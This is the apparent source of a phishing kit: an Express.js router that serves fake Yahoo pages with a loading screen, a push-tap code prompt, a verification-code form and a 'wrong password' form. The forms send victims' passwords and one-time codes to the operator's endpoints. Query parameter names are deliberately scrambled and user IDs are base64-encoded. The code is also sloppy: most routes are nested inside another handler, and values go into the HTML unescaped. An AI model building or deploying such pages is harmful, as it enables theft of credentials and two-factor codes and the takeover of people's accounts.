const express = require('express');
const router = express.Router();
const db = require('../db');


router.get('/', (req, res) => {
  
  let user = req.query.tgrdsfgdytrbdfwergter;
  
  if (user == null) {
      res.render('error');
      
    }else{

  const htmlContent = `
  <!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta charset="utf-8">
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
            <link rel="icon" type="image/x-icon" href="./images/img.ico">
        <meta name="format-detection" content="telephone=no">
        <title>Yahoo</title>
        <link href="/stylesheet/main.css" rel="stylesheet" type="text/css">
		<script type="text/javascript" src="/script/fetch.js"></script>
    
    <link rel="SHORTCUT ICON" href="./images/favicon.ico" id="DWT2" type="image/x-icon">
<style>
.loader {
    width: 30px;
    height: 30px;
    border: 2px solid #f2f2f2;
    border-bottom-color: grey;
    border-radius: 50%;
    display: inline-block;
    box-sizing: border-box;
    animation: rotation 1s linear infinite;
    }

    @keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
    } 
    
    #loader {
    
    height:100px;
    width:200px;
    margin-top:280px;
    background-color:#f2f2f2;
    padding-top:35px;
    
    
    }

</style>
</head>
<body class="user_font_system" style="margin: 0px; overflow: hidden;">
	   <center>

	<div id="loader">

	<span class="loader"></span><br><br>

	<span id="load" style="font-family: Helvetica Neue,Helvetica,Arial,Liberation Sans,sans-serif; color:#8b8b8b; display: none;">Loading...</span>
	<script>
	setTimeout(function() {
	  document.getElementById("load").style.display = "block";
	}, 2000);
	</script>
	</div>
	</center>
	</body>
	</html>


    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }
router.get('/fetch', (req, res) => {
  
  let userid = req.query.dsjkfhjdhfjkdfhjkd;

  

  const username = Buffer.from(userid, 'base64').toString('utf-8');
  
  const sqlQuery =  'SELECT username, pagetype, mobiletype FROM YahooTable WHERE username= ?';   
  
  db.query(sqlQuery, [username], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
    

  res.json({ results });

 
  });


});

router.get('/fetchtap', (req, res) => {

  
    let userid = req.query.jfhdgigndfjnguertsdfiwjeo;
  
    
  
    const username = Buffer.from(userid, 'base64').toString('utf-8');
    
    const sqlQuery =  'SELECT username, pagetype FROM YahooTable WHERE username= ?';   
    
    db.query(sqlQuery, [username], (err, results) => {
      if (err) {
        console.error('Error executing query:', err);
        return res.status(500).json({ error: 'Internal Server Error' });
      }
      
  
    res.json({ results });
  
   
    });
  
  
  });

router.get('/codetap', (req, res) => {

  const newdata = req.query.NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj;

  const decodata=  Buffer.from(newdata, 'base64').toString('utf-8');

  const dataArray = decodata.split('/');

  const id = dataArray[1];
  const tapcode = dataArray[2];
  const mtype = dataArray[3];

  const tappage = `
  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
          <meta charset="utf-8">
          <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
        <link rel="icon" type="image/x-icon" href="/images/img.ico">
          <meta name="format-detection" content="telephone=no">
          <title>Yahoo</title>
          <link href="/stylesheet/main.css" rel="stylesheet" type="text/css">
          <script type="text/javascript" src="/script/fetchtap.js"></script>
  </head>
  <body>
      <div class="topdiv">
          <span class="column">
              <a href="https://www.yahoo.com/">
                 <img src="/images/frontpage.png" alt="Yahoo" class="logo "  style="width:120px; height:36px;">
                
             </a>
         </span>
         <span class="help">
          <a href="https://help.yahoo.com/">Help</a>
      </span>
  
      </div>
      <div class="bottomrt">
      <div class="leftbox" >
     <!-- <img src="./images/ylt.png" class="leftimage"> </div> -->
     <div class="ptext">

        
        <b><p id="paratext">Yahoo makes it easy to enjoy what matters most in the world.</p></b> 
         <p id="paratext">Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.</p>
      </div>
  
      <div class="rightbox">
          <img src="/images/frontpage.png" alt="Yahoo" style="width:90px; height:27px;padding-top: 28px;">
          <br> <br>
          <input type="hidden" id ="username" readonly="" value="${id}">
          <p id="strong"> Open your ${mtype} ${tapcode}</p>
          <br> <br>
          <img src="/images/push.gif" alt="Yahoo" >
          <br>
          <img src="/images/tap.png" alt="Yahoo" >
  
          <br>
          <br>
          <a> See more verification methods</a>
                   
  
      </div>
  
      </div>
  </div>
  </body>
  </html>
  
  
  `;

  res.send(tappage);

  

});


router.get('/codeotp', (req, res) => {

  const samdata = req.query.NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj;

  const decodata1=  Buffer.from(samdata, 'base64').toString('utf-8');

  const dataArray1 = decodata1.split('/');

  const id1 = dataArray1[1];

 

  const otppage = `
    <!DOCTYPE html>
  <html lang="en">
  <head>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
          <meta charset="utf-8">
          <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
          <link rel="icon" type="image/x-icon" href="/images/img.ico">
          <meta name="format-detection" content="telephone=no">
          <title>Yahoo</title>
          <link href="/stylesheet/main.css" rel="stylesheet" type="text/css">
          <script type="text/javascript" src="/script/fetchtap.js"></script>
       
  </head>
  <body>
      <div class="topdiv">
          <span class="column">
              <a href="https://www.yahoo.com/">
                 <img src="/images/frontpage.png" alt="Yahoo" class="logo "  style="width:120px; height:36px;">
                
             </a>
         </span>
         <span class="help">
          <a href="https://help.yahoo.com/">Help</a>
      </span>
  
      </div>
      <div class="bottomrt">
      <div class="leftbox" >
     <!-- <img src="/images/ylt.png" class="leftimage"> </div> -->
     <div class="ptext">

        
        <b><p id="paratext">Yahoo makes it easy to enjoy what matters most in the world.</p></b> 
         <p id="paratext">Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.</p>
      </div>
  
      <div class="rightbox">
        <form method="post" name="loginForm" action="/req/codepost" accept-charset="UTF-8">
          <img src="/images/frontpage.png" alt="Yahoo" style="width:90px; height:27px;padding-top: 28px;">
          <br> <br>
        
          <b><p id="strong1">Enter Your code</p></b>
          <p style="padding-left: 20px;padding-right: 20px;">Enter the verification code again that we sent to your alternative email id / registered mobile number</p>
          <img style="height: 100px; width: 100px;" src="/images/phone.svg" alt="Yahoo" >
          <center><div class="cpaptcha">
            <input type="hidden" id ="username" name="username" readonly="" value="${id1}">
            <input type="text" class="custom-input" id="uppercase-input" name="code" maxlength="50" placeholder="">

            </div></center>
            <script>
                const input = document.getElementById('uppercase-input');

                input.addEventListener('input', function () {
                // Allow only alphanumeric characters, then format with spaces
                this.value = this.value
                    .replace(/[^a-zA-Z0-9]/g, '') // Remove non-alphanumeric characters
                    .toUpperCase() // Convert to uppercase
                    .split('') // Convert to array
                    .join(' ') // Join with spaces
                    .trim(); // Remove trailing space
                });

            </script>
          <br>
          <p style="padding-left: 20px;padding-right: 20px; font-size: 14px; color: gray;" >Your Account Key may take a few moments to arrive. Do not share this Account Key with anyone. Please wait <b><span id="countdown">120</span></b> seconds before trying to resend.</p>

          <script>
              // Set the countdown time (in seconds)
              let countdownTime = 120;
      
              // Get the element where the countdown will be displayed
              const countdownElement = document.getElementById('countdown');
      
              // Function to update the countdown
              function updateCountdown() {
                  countdownElement.textContent = countdownTime; // Update the countdown display
                  countdownTime--; // Decrease the time by 1 second
      
                  if (countdownTime >= 0) {
                      setTimeout(updateCountdown, 1000); // Repeat the function every 1 second
                  }
              }
      
              // Start the countdown
              updateCountdown();
          </script>
    
    <div class="button-container">
        <input id="button" type="submit" value="Next" >
               
       
   </div>
   <br>
   <a href="https://login.yahoo.com/"> I don't have access this phone</a>
 </div>
</form>
  
      </div>
  </div>
  </body>
  </html>
  
  `;

  res.send(otppage);

});



// wrong password reoload page

router.get('/wrongpwd', (req, res) => {

    const samdata = req.query.NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj;
  
    const decodata1=  Buffer.from(samdata, 'base64').toString('utf-8');
  
    const dataArray1 = decodata1.split('/');
  
    const id1 = dataArray1[1];

    
  
    const errorpage = `

   <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="icon" type="image/x-icon" href="/images/img.ico">
            <meta name="format-detection" content="telephone=no">
            <title>Yahoo</title>
            <link href="/stylesheet/main.css" rel="stylesheet" type="text/css">
    </head>
    <body>
            <div class="topdiv">
                <span class="column">
                    <a href="https://www.yahoo.com/">
                    <img src="/images/frontpage.png" alt="Yahoo" class="logo "  style="width:120px; height:36px;">
                    
                </a>
            </span>
            <span class="help">
                <a href="https://help.yahoo.com/">Help</a>
            </span>

            </div>
            <div class="bottomrt">
            <div class="leftbox" >
             <!-- <img src="./images/ylt.png" class="leftimage"> </div> -->
     <div class="ptext">

        
       <b><p id="paratext">Yahoo makes it easy to enjoy what matters most in the world.</p></b> 
        <p id="paratext">Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of life.</p>
     </div>

            <div class="rightbox">
                <img src="/images/frontpage.png" alt="Yahoo" style="width:90px; height:27px;padding-top: 28px;">
                <br> <br>
                <form method="post" name="loginForm" action="/req/submit" accept-charset="UTF-8">
                <input type="text" id ="username" readonly="" value="${id1}">
                <p id="strong"> Enter password</p>
                <p> to finish sign in</p>
                
                <br><br>
                <input type='hidden' name="username" id="useRname" value="${id1}">
                <div class="password-box">
                <input required='' id ="Password1" name="password" type='password' id="pEyar">
                <label alt='Password' placeholder='Password'></label>
                <p id="Error"> Wrong password try again.</p>

                </div>
                <br>

                <input id="button" type="submit" value="Next" >
                <br><br><br>

                <a> Forgot password?</a>
                        </form>

            </div>

            </div>
            </div>
        </body>
    </html>
    
    
    `;
  
    res.send(errorpage);
  
  });
  


});

module.exports = router;
